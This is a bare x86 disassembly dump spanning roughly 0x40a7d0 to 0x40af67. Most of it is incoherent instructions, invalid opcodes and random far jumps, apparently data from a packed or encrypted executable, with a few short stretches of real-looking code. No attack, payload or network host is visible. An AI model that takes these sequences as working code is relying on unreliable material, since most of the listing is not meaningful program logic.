  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	outs   dx,BYTE PTR ds:[esi]
  40a7d7:	lods   eax,DWORD PTR ds:[esi]
  40a7d8:	mul    BYTE PTR [esi+edi*8-0x56414161]
  40a7df:	ret    0xbebe
  40a7e2:	pop    eax
  40a7e3:	mov    ch,0xab
  40a7e5:	xchg   ebx,eax
  40a7e6:	xor    al,0xf4
  40a7e8:	xor    al,0xa0
  40a7ea:	fcom   DWORD PTR [ebx]
  40a7ec:	adc    ah,cl
  40a7ee:	aas    
  40a7ef:	pop    edx
  40a7f0:	in     eax,dx
  40a7f1:	mov    ecx,0x22bae62f
  40a7f6:	repnz push edx
  40a7f8:	sub    BYTE PTR [esi-0x78],bl
  40a7fb:	xlat   BYTE PTR ds:[ebx]
  40a7fc:	sbb    edi,eax
  40a7fe:	xchg   edi,eax
  40a7ff:	inc    ebx
  40a800:	aas    
  40a801:	leave  
  40a802:	aas    
  40a803:	push   ds
  40a804:	jp     0x40a7e7
  40a806:	inc    edi
  40a807:	fwait
  40a808:	dec    eax
  40a809:	fist   DWORD PTR [ebp-0x65]
  40a80c:	inc    ebx
  40a80d:	ficomp DWORD PTR [eax-0x25]
  40a810:	jmp    0x8b04:0xf919bee2
  40a817:	ja     0x40a7bb
  40a819:	sbb    ecx,ebx
  40a81b:	cmp    DWORD PTR [ecx+eiz*8],0x87fc85a9
  40a822:	jl     0x40a7bb
  40a824:	out    dx,eax
  40a825:	inc    eax
  40a826:	fs or  eax,0x5d78bdf9
  40a82c:	mov    bl,0xd1
  40a82e:	push   DWORD PTR [ebp+0x8]
  40a831:	pop    esp
  40a832:	mov    ebp,edi
  40a834:	inc    esp
  40a835:	inc    ecx
  40a836:	das    
  40a837:	dec    ebx
  40a838:	and    edx,DWORD PTR [ebp-0x6b94207c]
  40a83e:	daa    
  40a83f:	icebp  
  40a840:	jmp    0x56b1:0x43649534
  40a847:	cdq    
  40a848:	bound  edx,QWORD PTR [ebx+0x1b]
  40a84b:	cmp    al,0x69
  40a84d:	fild   QWORD PTR [esi]
  40a84f:	push   eax
  40a850:	inc    esi
  40a851:	jle    0x40a7ee
  40a853:	test   eax,0x1b81e08
  40a858:	adc    BYTE PTR [edi+0x46],dl
  40a85b:	mov    ds:0x8fc36f44,eax
  40a860:	adc    eax,0xac073122
  40a865:	pusha  
  40a866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a867:	cmp    eax,0xaf058e95
  40a86c:	or     al,0x74
  40a86e:	dec    esp
  40a86f:	dec    ebx
  40a870:	mov    bh,0x7a
  40a872:	mov    bl,0x63
  40a874:	jg     0x40a854
  40a876:	fiadd  DWORD PTR [esi]
  40a878:	dec    esp
  40a879:	inc    esi
  40a87a:	dec    esi
  40a87b:	aas    
  40a87c:	mov    bh,0x3a
  40a87e:	js     0x40a8f2
  40a880:	sahf   
  40a881:	inc    ebx
  40a882:	jo     0x40a818
  40a884:	and    eax,0xc27cc8fe
  40a889:	xor    al,0x7c
  40a88b:	jae    0x40a8bb
  40a88d:	cmp    ebp,0x41
  40a890:	xor    al,0xa0
  40a892:	or     dh,BYTE PTR [edx-0x9ca047]
  40a898:	ins    DWORD PTR es:[edi],dx
  40a899:	cmp    ebp,0xe
  40a89c:	rsqrtps xmm1,XMMWORD PTR [ebx+esi*2+0x1b]
  40a8a1:	add    edi,ecx
  40a8a3:	inc    edi
  40a8a4:	ret    0x4cc6
  40a8a7:	add    esp,DWORD PTR es:[ebx+ebp*2+0x181cab45]
  40a8af:	daa    
  40a8b0:	dec    edx
  40a8b1:	xor    BYTE PTR [ecx+0x2f13eca9],cl
  40a8b7:	dec    esi
  40a8b8:	in     eax,dx
  40a8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ba:	cmp    BYTE PTR [ecx-0x3deb9d1b],dl
  40a8c0:	pop    ecx
  40a8c1:	jmp    0x7c51ddae
  40a8c6:	mov    BYTE PTR [edi-0x3887d2b4],dl
  40a8cc:	push   ebp
  40a8cd:	push   ecx
  40a8ce:	cmc    
  40a8cf:	adc    al,0xe4
  40a8d1:	fcomp  QWORD PTR [edx]
  40a8d3:	sub    eax,0x3dd99179
  40a8d8:	or     al,bl
  40a8da:	jmp    0xd195:0x6ecf45a0
  40a8e1:	push   cs
  40a8e2:	mov    ah,0x8
  40a8e4:	and    eax,0xa1c665cd
  40a8e9:	rcr    esp,1
  40a8eb:	fdivr  DWORD PTR [edx-0x5f14abea]
  40a8f1:	mov    fs,WORD PTR [ebx+0x5bb2b417]
  40a8f7:	int    0x84
  40a8f9:	adc    BYTE PTR cs:[esi+ebx*4-0x24663b43],0xfe
  40a902:	inc    eax
  40a903:	mov    bh,0xfc
  40a905:	in     eax,dx
  40a906:	inc    esp
  40a907:	adc    ah,ah
  40a909:	mov    ebx,0x104b3ac1
  40a90e:	ds push eax
  40a910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a911:	int3   
  40a912:	cli    
  40a913:	push   ebx
  40a914:	add    dh,cl
  40a916:	pop    eax
  40a917:	jbe    0x40a938
  40a919:	mov    dh,0x8
  40a91b:	test   al,0x2
  40a91d:	pop    esi
  40a91e:	mov    ah,dh
  40a920:	xchg   edx,eax
  40a921:	in     al,dx
  40a922:	push   ebp
  40a923:	add    al,0xa2
  40a925:	xchg   edi,eax
  40a926:	aad    0x0
  40a928:	leave  
  40a929:	aaa    
  40a92a:	addr16 mov edx,0xefe0c965
  40a930:	adc    eax,esp
  40a932:	xlat   BYTE PTR ds:[ebx]
  40a933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a934:	xor    ebp,edi
  40a936:	lea    eax,ds:0xac8e03ff
  40a93c:	jle    0x40a94a
  40a93e:	mov    bh,0x30
  40a940:	fwait
  40a941:	gs push 0xfffffff2
  40a944:	lds    edx,FWORD PTR [ecx-0x39]
  40a947:	mov    bl,0x56
  40a949:	repz xor cl,bl
  40a94c:	stos   DWORD PTR es:[edi],eax
  40a94d:	xor    ebx,DWORD PTR [edi-0xe]
  40a950:	dec    ebx
  40a951:	stc    
  40a952:	push   cs
  40a953:	xchg   ecx,eax
  40a954:	push   ebx
  40a955:	add    bh,BYTE PTR [esi+0x1f72d4b6]
  40a95b:	cli    
  40a95c:	mov    dh,0x45
  40a95e:	out    dx,eax
  40a95f:	add    eax,0x903aa5dc
  40a964:	stos   DWORD PTR es:[edi],eax
  40a965:	ror    BYTE PTR [ebx],1
  40a967:	leave  
  40a968:	ss pop ecx
  40a96a:	inc    esi
  40a96b:	ins    DWORD PTR es:[edi],dx
  40a96c:	xchg   ebx,eax
  40a96d:	push   ds
  40a96e:	pop    ebp
  40a96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a970:	mov    ch,cl
  40a972:	cdq    
  40a973:	mov    bh,0x93
  40a976:	inc    ebx
  40a977:	inc    ebx
  40a978:	sbb    edx,esi
  40a97a:	push   edi
  40a97b:	sub    DWORD PTR [ebx],edi
  40a97d:	or     cl,dl
  40a97f:	ins    BYTE PTR es:[edi],dx
  40a980:	icebp  
  40a981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a982:	or     esp,DWORD PTR [ecx-0x1e81c508]
  40a988:	inc    esp
  40a989:	std    
  40a98a:	adc    edx,DWORD PTR [eax]
  40a98c:	ja     0x40a913
  40a98e:	jne    0x40a92c
  40a990:	xor    al,al
  40a992:	add    BYTE PTR ds:0x66d5f61e,dh
  40a998:	and    esp,DWORD PTR [ebp+0x7c]
  40a99b:	add    bh,ch
  40a99d:	inc    ebp
  40a99e:	fld    TBYTE PTR [ebx+0xe]
  40a9a1:	sub    bh,BYTE PTR [edx]
  40a9a3:	push   DWORD PTR [ecx+0x21cea9ad]
  40a9a9:	xlat   BYTE PTR ds:[ebx]
  40a9aa:	pop    ecx
  40a9ab:	imul   esp,DWORD PTR [ebx+0x3b],0x75
  40a9af:	xor    al,0x4e
  40a9b1:	mov    WORD PTR ss:[eax+0x380a1467],ds
  40a9b8:	test   DWORD PTR ss:0xfda467ac,ebx
  40a9bf:	test   eax,0xaf59f015
  40a9c4:	jne    0x40aa21
  40a9c6:	je     0x40a95d
  40a9c8:	inc    eax
  40a9c9:	adc    ebp,0xd1f3e9ef
  40a9cf:	push   ebp
  40a9d0:	les    esp,FWORD PTR [eax-0x78]
  40a9d3:	pop    eax
  40a9d4:	mov    ebp,0xcf76b92a
  40a9d9:	lahf   
  40a9da:	inc    ecx
  40a9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9dc:	or     ebx,edi
  40a9de:	dec    cl
  40a9e0:	push   0x52
  40a9e2:	push   ds
  40a9e3:	out    0xe6,al
  40a9e5:	cmc    
  40a9e6:	jmp    0x2f28:0x46ae671a
  40a9ed:	mov    BYTE PTR [esi+0x59],0xe7
  40a9f1:	sbb    dl,BYTE PTR [edi]
  40a9f3:	add    BYTE PTR [edx+0x5],cl
  40a9f6:	imul   ecx,edx,0xffffffc8
  40a9f9:	inc    edi
  40a9fa:	inc    edx
  40a9fb:	push   ds
  40a9fc:	mov    ch,0xa3
  40a9fe:	dec    eax
  40a9ff:	retf   
  40aa00:	or     eax,0xdc16eefe
  40aa05:	int3   
  40aa06:	sub    esi,ebp
  40aa08:	in     eax,0xb3
  40aa0a:	dec    esi
  40aa0b:	icebp  
  40aa0c:	pop    eax
  40aa0d:	je     0x40a9da
  40aa0f:	gs push ds
  40aa11:	pop    edx
  40aa12:	bound  eax,QWORD PTR [esi+0x25a170d5]
  40aa18:	rol    BYTE PTR ds:0xcc0e7009,0x37
  40aa1f:	ss inc ecx
  40aa21:	push   0x3a
  40aa23:	cmp    BYTE PTR [eax],dh
  40aa25:	push   cs
  40aa26:	aas    
  40aa27:	cs mov bh,0x28
  40aa2a:	mov    esp,0x2774a678
  40aa2f:	jns    0x40aa46
  40aa31:	mov    ebp,0x6ae20373
  40aa36:	shl    edi,cl
  40aa38:	cld    
  40aa39:	out    dx,eax
  40aa3a:	iret   
  40aa3b:	or     eax,0x1e5ae182
  40aa40:	adc    cl,bl
  40aa42:	nop
  40aa43:	aam    0x20
  40aa45:	jns    0x40aab5
  40aa47:	xchg   ecx,eax
  40aa48:	ins    DWORD PTR es:[edi],dx
  40aa49:	loopne 0x40aa6f
  40aa4b:	sahf   
  40aa4c:	push   ds
  40aa4d:	in     al,0x96
  40aa4f:	int    0xd5
  40aa51:	adc    BYTE PTR [eax-0x6b],cl
  40aa54:	neg    DWORD PTR [ebx+0x53]
  40aa57:	fs push edi
  40aa59:	neg    BYTE PTR [ecx-0x52]
  40aa5c:	sub    eax,edx
  40aa5e:	xor    edx,edx
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	xor    esp,ebx
  40aaa0:	sub    cl,dl
  40aaa2:	jmp    0xbec2:0xa9bebea5
  40aaa9:	mov    esi,0xdb620445
  40aaae:	jae    0x40aaa1
  40aab0:	loopne 0x40ab05
  40aab2:	je     0x40aa90
  40aab4:	aad    0x27
  40aab6:	shl    BYTE PTR [ebx-0x339ebb9f],cl
  40aabc:	ret    0x7fe3
  40aabf:	xchg   edx,eax
  40aac0:	mov    edi,0x8f7db609
  40aac5:	dec    eax
  40aac6:	inc    eax
  40aac7:	daa    
  40aac8:	mov    bl,0xcb
  40aaca:	and    BYTE PTR ds:0x3c21fe9,dl
  40aad0:	rcr    DWORD PTR [ecx-0x20],1
  40aad3:	mov    dl,0xc3
  40aad5:	(bad)  
  40aad7:	jns    0x40aaf0
  40aad9:	push   eax
  40aada:	cmp    al,BYTE PTR [edx+0x22a53881]
  40aae0:	ret    
  40aae1:	and    ebx,DWORD PTR [ecx+0x158ec1dc]
  40aae7:	jne    0x40ab4a
  40aae9:	adc    ebx,0xffffffba
  40aaec:	sub    BYTE PTR [edi],0xd7
  40aaef:	cld    
  40aaf0:	mov    ds:0x5ddcd2c,al
  40aaf5:	pop    ebx
  40aaf6:	fwait
  40aaf7:	(bad)  
  40aaf8:	ss es and eax,0xecd9ac64
  40aaff:	cld    
  40ab00:	sub    esi,DWORD PTR [esp+edx*1+0x290baf44]
  40ab07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab08:	add    al,BYTE PTR [ebp+0x2d]
  40ab0b:	in     eax,0xc2
  40ab0d:	ret    
  40ab0e:	jge    0x40ab8c
  40ab10:	lea    esp,[edx+0x167c512f]
  40ab16:	push   ebx
  40ab17:	sbb    BYTE PTR ds:0x121f1539,dl
  40ab1d:	mov    DWORD PTR [eax-0x331ccd8d],esp
  40ab23:	(bad)  
  40ab24:	lds    ebx,FWORD PTR [esi-0x2cf111ab]
  40ab2a:	cmp    eax,0x5ad5eaca
  40ab2f:	pop    ebp
  40ab30:	rcl    DWORD PTR [ebp-0x32],1
  40ab33:	and    eax,0x45bbff79
  40ab38:	push   edi
  40ab39:	inc    esi
  40ab3a:	int    0xad
  40ab3c:	dec    ecx
  40ab3d:	cdq    
  40ab3e:	pop    esp
  40ab3f:	xchg   DWORD PTR [esi],eax
  40ab41:	call   0xcacdbe03
  40ab46:	mov    DWORD PTR [edx],ebp
  40ab48:	sbb    dl,BYTE PTR [ebp-0x25a3d84f]
  40ab4e:	adc    al,0x72
  40ab50:	retf   0x7d8
  40ab53:	xor    eax,0x3c0e72fe
  40ab58:	sysenter 
  40ab5a:	mov    eax,0x882dc9c1
  40ab5f:	inc    esp
  40ab60:	fisubr DWORD PTR [edi]
  40ab62:	aaa    
  40ab63:	outs   dx,DWORD PTR ds:[esi]
  40ab64:	paddd  mm3,QWORD PTR [esi]
  40ab67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab68:	ror    DWORD PTR [ebx-0x5f],0x58
  40ab6c:	xchg   DWORD PTR [esi-0x6f],edi
  40ab6f:	xchg   ebx,eax
  40ab70:	rol    BYTE PTR [ebp-0x38],1
  40ab73:	jbe    0x40abc9
  40ab75:	or     al,0x1d
  40ab77:	add    BYTE PTR [ebx+edi*4+0x19],cl
  40ab7b:	cli    
  40ab7c:	imul   ch
  40ab7e:	mov    dh,0xcc
  40ab80:	sbb    edx,DWORD PTR [esi+0x6baf3b30]
  40ab86:	mov    ds:0xea2a520e,al
  40ab8b:	pop    edi
  40ab8c:	out    0x4a,eax
  40ab8e:	pop    esp
  40ab8f:	jmp    0x7cb67924
  40ab94:	push   esi
  40ab95:	dec    edi
  40ab96:	adc    DWORD PTR [eax-0x1],0x9c15dd04
  40ab9d:	inc    BYTE PTR [ecx-0x7c]
  40aba0:	adc    al,0x4e
  40aba2:	adc    eax,0xe669f54c
  40aba7:	aad    0xc2
  40aba9:	xor    ch,BYTE PTR [edx+0x79]
  40abac:	sar    BYTE PTR [eax-0x72213b98],cl
  40abb2:	rol    DWORD PTR [edx],cl
  40abb4:	int3   
  40abb5:	cdq    
  40abb6:	adc    DWORD PTR [edx+0x4e288ca4],esp
  40abbc:	cpuid  
  40abbe:	ds hlt 
  40abc0:	dec    ebx
  40abc1:	(bad)  
  40abc3:	iret   
  40abc4:	jnp    0x40ac24
  40abc6:	push   ebp
  40abc7:	out    dx,eax
  40abc8:	jne    0x40ac44
  40abca:	pop    ebx
  40abcb:	cmc    
  40abcc:	lea    eax,[esi]
  40abce:	repz mov esi,0xdc510f1d
  40abd4:	lock push edx
  40abd6:	jne    0x40ab77
  40abd8:	es ss shl ah,0xe1
  40abdd:	ins    DWORD PTR es:[edi],dx
  40abde:	scas   eax,DWORD PTR es:[edi]
  40abdf:	pusha  
  40abe0:	jo     0x40ab6b
  40abe2:	add    eax,0x4e992f35
  40abe7:	jmp    0x40abe8
  40abe9:	popa   
  40abea:	(bad)  
  40abeb:	pop    ebp
  40abec:	jle    0x40abfc
  40abee:	add    al,0x1
  40abf0:	mov    al,ds:0x7d86c769
  40abf5:	jmp    0x40ac6c
  40abf7:	mov    ecx,0x5cda80e4
  40abfc:	jns    0x40aba6
  40abfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abff:	add    BYTE PTR [esi-0x4e46affe],bh
  40ac05:	rcl    BYTE PTR [esi-0x66],cl
  40ac08:	ds mov eax,ecx
  40ac0b:	loopne 0x40abd5
  40ac0d:	add    esi,DWORD PTR [edx+edx*4]
  40ac10:	cdq    
  40ac11:	push   ds
  40ac12:	jbe    0x40ac65
  40ac14:	dec    eax
  40ac15:	mov    ds:0x1c719424,al
  40ac1a:	shl    eax,0x62
  40ac1d:	dec    esi
  40ac1e:	sbb    BYTE PTR [ecx],bh
  40ac20:	fld    QWORD PTR ds:0x7711e6ca
  40ac26:	cmp    eax,0x5aff0fa5
  40ac2b:	push   cs
  40ac2c:	sub    DWORD PTR [edx+0x25aff9f4],0x1b0fcbc1
  40ac36:	icebp  
  40ac37:	and    BYTE PTR [ebx+0x5c043c17],al
  40ac3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac3e:	pop    edi
  40ac3f:	loope  0x40acb6
  40ac41:	and    eax,0x29553908
  40ac46:	repnz sub BYTE PTR [ecx+0x2ee4a655],dh
  40ac4d:	and    dh,BYTE PTR [ebx+0x54]
  40ac50:	mov    WORD PTR [esi-0x2b],gs
  40ac53:	je     0x40acb5
  40ac55:	mov    al,ds:0x18adda22
  40ac5a:	icebp  
  40ac5b:	xchg   ebp,eax
  40ac5c:	lock push edi
  40ac5e:	xchg   esp,eax
  40ac5f:	xor    BYTE PTR [edx+0x20],0xf1
  40ac63:	jo     0x40ace4
  40ac65:	lock mov ebp,0x89976cb1
  40ac6b:	mov    al,ds:0xc9e3c3e1
  40ac70:	xchg   ebx,eax
  40ac71:	cmp    ebx,DWORD PTR [esi]
  40ac73:	cmp    eax,0x31350a7
  40ac78:	sbb    edi,DWORD PTR [edi+0x7]
  40ac7b:	out    dx,al
  40ac7c:	xchg   esp,eax
  40ac7d:	mov    ebx,0x38c92b17
  40ac82:	xor    al,0x5
  40ac84:	call   0x3536be9c
  40ac89:	adc    BYTE PTR [ebx+0x4f],0x35
  40ac8d:	nop
  40ac8e:	adc    eax,0x72b0efad
  40ac93:	stc    
  40ac94:	jno    0x40ac4e
  40ac96:	sbb    al,0xce
  40ac98:	jge    0x40ac74
  40ac9a:	jmp    0x238:0xc50a0ff5
  40aca1:	push   eax
  40aca2:	ins    DWORD PTR es:[edi],dx
  40aca3:	call   0x7beb:0x1a4efa39
  40acaa:	out    dx,al
  40acab:	fadd   st(5),st
  40acad:	aam    0xf2
  40acaf:	pushf  
  40acb0:	xchg   esp,eax
  40acb1:	dec    eax
  40acb2:	call   0xe8e2d0eb
  40acb7:	das    
  40acb8:	mov    eax,0xfc370916
  40acbd:	ins    DWORD PTR es:[edi],dx
  40acbe:	mov    al,0x25
  40acc0:	mov    dl,0x90
  40acc2:	lock popa 
  40acc4:	dec    BYTE PTR [edx]
  40acc6:	mov    ebp,0xe89f896b
  40accb:	(bad)  
  40accd:	xchg   edi,eax
  40acce:	sub    eax,0xdd482380
  40acd3:	pop    ebp
  40acd4:	ds dec eax
  40acd6:	int3   
  40acd7:	cld    
  40acd8:	add    BYTE PTR [ecx-0x1fbd9e81],ch
  40acde:	cdq    
  40acdf:	aam    0x74
  40ace1:	lods   eax,DWORD PTR ds:[esi]
  40ace2:	push   ecx
  40ace3:	push   edi
  40ace4:	rol    BYTE PTR [esp+edx*4-0x4970e521],1
  40aceb:	jae    0x40acf1
  40aced:	pop    edi
  40acee:	aaa    
  40acef:	fisttp QWORD PTR [eax]
  40acf1:	cmc    
  40acf2:	mov    ch,0xb3
  40acf4:	cmp    eax,0x4ba1e385
  40acf9:	mov    bh,0x52
  40acfb:	lock xchg ebx,eax
  40acfd:	das    
  40acfe:	pop    ecx
  40acff:	retf   0x28f2
  40ad02:	pop    ebx
  40ad03:	out    0x9a,al
  40ad05:	leave  
  40ad06:	or     DWORD PTR [ecx],edx
  40ad08:	sbb    al,0xda
  40ad0a:	push   es
  40ad0b:	les    edx,FWORD PTR [eax+0x5e]
  40ad0e:	sub    bl,BYTE PTR [edx-0x5d]
  40ad11:	gs mov ax,0xe723
  40ad16:	das    
  40ad17:	mov    dh,0x6f
  40ad19:	mov    ebx,0xa1ef9f1e
  40ad1e:	xor    eax,0x5851558a
  40ad23:	adc    dh,BYTE PTR [ebx]
  40ad25:	rol    bh,cl
  40ad27:	inc    ebp
  40ad28:	call   0x40aeb4
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x422728
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi+0x52fe3f90],bl
  40ad62:	sahf   
  40ad63:	aad    0xa9
  40ad65:	mov    esi,0xbec2a9be
  40ad6a:	mov    esi,0x8915f910
  40ad6f:	stc    
  40ad70:	in     al,dx
  40ad71:	push   ecx
  40ad72:	and    eax,0x96817379
  40ad77:	xor    BYTE PTR [eax-0x65698822],0xef
  40ad7e:	mov    ebp,0xc6f84df2
  40ad83:	xchg   edi,eax
  40ad84:	js     0x40ad61
  40ad86:	into   
  40ad87:	data16 sub bh,dl
  40ad8a:	mov    edi,0xa27cbe54
  40ad8f:	sti    
  40ad90:	xchg   edi,eax
  40ad91:	popa   
  40ad92:	popf   
  40ad93:	cs push es
  40ad95:	data16 or BYTE PTR [edi+0xc],dh
  40ad99:	out    0x6c,eax
  40ad9b:	(bad)  
  40ad9c:	fld    QWORD PTR [esi]
  40ad9e:	mov    WORD PTR [edi-0x80],gs
  40ada1:	retf   
  40ada2:	sti    
  40ada3:	aaa    
  40ada4:	mov    ds:0xf7a94480,al
  40ada9:	mov    dh,0xea
  40adab:	adc    BYTE PTR [esi-0x7b],dh
  40adae:	test   DWORD PTR [ecx+0x364815a5],0x28da09e5
  40adb8:	inc    ecx
  40adb9:	adc    eax,0x88607269
  40adbe:	and    bh,BYTE PTR [edx]
  40adc0:	xor    DWORD PTR [esi+0x458be1a2],0x55650226
  40adca:	push   eax
  40adcb:	test   BYTE PTR [edi-0x6d01b49f],dl
  40add1:	mov    ebx,0x8a0a096c
  40add6:	aam    0xed
  40add8:	cmp    BYTE PTR [edx],dl
  40adda:	xchg   ebp,eax
  40addb:	retf   0x4c63
  40adde:	push   esi
  40addf:	sbb    al,0x68
  40ade1:	sbb    al,0xf7
  40ade3:	pusha  
  40ade4:	icebp  
  40ade5:	js     0x40ae02
  40ade7:	or     esp,DWORD PTR [edx+ebx*8+0x71]
  40adeb:	sbb    ebx,ebp
  40aded:	sbb    ch,0xfc
  40adf0:	add    eax,0x5985df44
  40adf5:	xor    al,0xa0
  40adf7:	int    0xa7
  40adf9:	dec    eax
  40adfa:	xchg   edx,ebp
  40adfc:	add    BYTE PTR [edi+0x6],0x6a
  40ae00:	loop   0x40ae00
  40ae02:	sbb    ebp,DWORD PTR [edx+0x191fdbfc]
  40ae08:	mov    dh,0x9
  40ae0a:	inc    eax
  40ae0b:	inc    edx
  40ae0c:	popf   
  40ae0d:	fmul   st(1),st
  40ae0f:	icebp  
  40ae10:	push   ebx
  40ae11:	xor    al,0x6d
  40ae13:	lahf   
  40ae14:	loopne 0x40ae89
  40ae16:	out    dx,al
  40ae17:	jle    0x40ae31
  40ae19:	xchg   ebx,eax
  40ae1a:	push   eax
  40ae1b:	adc    BYTE PTR [edi],al
  40ae1d:	push   cs
  40ae1e:	(bad)  
  40ae1f:	mov    bl,0xd8
  40ae21:	not    dh
  40ae23:	mov    edx,0xa0e20b8f
  40ae28:	xor    DWORD PTR [ebx+0x31],0x49
  40ae2c:	pop    ecx
  40ae2d:	mov    ss,WORD PTR [edx-0x3db745cb]
  40ae33:	sbb    BYTE PTR [edi-0x1cd3cdac],bh
  40ae39:	jmp    0x8f27:0xb97d83aa
  40ae40:	mov    eax,0xd2776e1a
  40ae45:	outs   dx,DWORD PTR ds:[esi]
  40ae46:	aaa    
  40ae47:	jmp    0x841a1031
  40ae4c:	dec    eax
  40ae4d:	pushf  
  40ae4e:	add    al,0xc7
  40ae50:	jnp    0x40aeaf
  40ae52:	pop    eax
  40ae53:	xchg   edx,eax
  40ae54:	fstp   QWORD PTR [edi]
  40ae56:	ret    0x8f77
  40ae59:	pushf  
  40ae5a:	adc    BYTE PTR ds:0x341988c9,cl
  40ae60:	adc    eax,0x1d8b98ca
  40ae65:	js     0x40ae21
  40ae67:	jmp    0x40aecd
  40ae69:	mov    ecx,0xf63e9609
  40ae6e:	jnp    0x40ae3b
  40ae70:	ror    BYTE PTR [eax-0x19],1
  40ae73:	dec    esp
  40ae74:	neg    BYTE PTR [esp+eiz*8]
  40ae77:	hlt    
  40ae78:	fcmovnb st,st(7)
  40ae7a:	add    ah,BYTE PTR [ecx-0x46541e8f]
  40ae80:	aam    0xbd
  40ae82:	push   0x5984bcd9
  40ae87:	arpl   WORD PTR [ebp+0x7439a556],dx
  40ae8d:	xchg   edi,eax
  40ae8e:	pop    ds
  40ae8f:	and    ah,BYTE PTR [ebp+ebp*1+0x4fa42e45]
  40ae96:	sbb    ebx,DWORD PTR [edi]
  40ae98:	call   0xcbcc4d3f
  40ae9d:	xchg   esp,eax
  40ae9e:	fsub   st,st(7)
  40aea0:	sbb    esp,edx
  40aea2:	pop    es
  40aea3:	pop    ecx
  40aea4:	xchg   esi,eax
  40aea5:	stc    
  40aea6:	xchg   ebx,eax
  40aea7:	bound  ecx,QWORD PTR [ebx-0x55]
  40aeaa:	jg     0x40aed2
  40aeac:	sub    cl,BYTE PTR [esi+0x7ef75f51]
  40aeb2:	cmp    ch,BYTE PTR [esp+edi*4-0x52]
  40aeb6:	xchg   ecx,eax
  40aeb7:	mov    ebp,0xa622a6a4
  40aebc:	gs mov bl,bl
  40aebf:	push   cs
  40aec0:	inc    eax
  40aec1:	xchg   esi,eax
  40aec2:	pop    ss
  40aec3:	xchg   esi,eax
  40aec4:	retf   
  40aec5:	dec    edx
  40aec6:	stc    
  40aec7:	mov    bh,0x32
  40aec9:	cmp    eax,0x9bd6cda3
  40aece:	out    dx,eax
  40aecf:	dec    edi
  40aed0:	std    
  40aed1:	lods   eax,DWORD PTR ds:[esi]
  40aed2:	push   cs
  40aed3:	fisub  DWORD PTR [ebp-0x5f]
  40aed6:	mov    eax,DWORD PTR cs:[edi+0x7f]
  40aeda:	int3   
  40aedb:	out    dx,al
  40aedc:	loop   0x40af4a
  40aede:	mov    ch,0xce
  40aee0:	push   eax
  40aee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee2:	and    DWORD PTR [esi+0x5a6b017a],ebx
  40aee8:	int    0x41
  40aeea:	jmp    0xfda19f69
  40aeef:	push   cs
  40aef0:	add    bl,dh
  40aef2:	dec    edx
  40aef3:	dec    ebp
  40aef4:	daa    
  40aef5:	dec    edi
  40aef6:	adc    eax,0xa23fb17c
  40aefb:	cmp    ebx,DWORD PTR [esi+0x2bbedb33]
  40af01:	xchg   ecx,eax
  40af02:	xchg   esp,eax
  40af03:	inc    eax
  40af04:	sbb    eax,0xe0089471
  40af09:	aaa    
  40af0a:	xchg   esp,eax
  40af0b:	push   cs
  40af0c:	sub    BYTE PTR [ecx+0x82ae94a],0x1f
  40af13:	mov    dh,0xbf
  40af15:	loop   0x40af84
  40af17:	cmp    BYTE PTR [ecx],ch
  40af19:	ja     0x40af64
  40af1b:	aam    0x21
  40af1d:	xchg   edx,eax
  40af1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af1f:	pushf  
  40af20:	dec    esi
  40af21:	push   edi
  40af22:	sbb    al,0xd4
  40af24:	imul   DWORD PTR [ebp+0x5b]
  40af27:	and    BYTE PTR [esi+0x7e],ah
  40af2a:	push   ds
  40af2b:	inc    ebx
  40af2c:	or     bh,BYTE PTR [edx+eax*8]
  40af2f:	mov    al,0x8e
  40af31:	dec    esp
  40af32:	mov    BYTE PTR [eax-0x23],dh
  40af35:	loope  0x40aef6
  40af37:	jp     0x40af1f
  40af39:	and    eax,0x93f3ef2d
  40af3e:	jnp    0x40aef3
  40af40:	mov    eax,0xf50cd6ed
  40af45:	fstp   DWORD PTR [ecx+eiz*8+0x2dc6f1dc]
  40af4c:	mov    ch,ch
  40af4e:	or     al,0xcf
  40af50:	cmp    ecx,esp
  40af52:	dec    esi
  40af53:	retf   0x533e
  40af56:	adc    ebp,DWORD PTR [edi]
  40af58:	pop    es
  40af59:	ficomp WORD PTR [esi+0x15]
  40af5c:	sbb    eax,0x6966f8ed
  40af61:	(bad)  
  40af62:	ins    DWORD PTR es:[edi],dx
  40af63:	(bad)  
  40af64:	(bad)  
  40af65:	lea    ebp,[edi]
  40af67:	scas   al,BYTE PTR es:[edi]
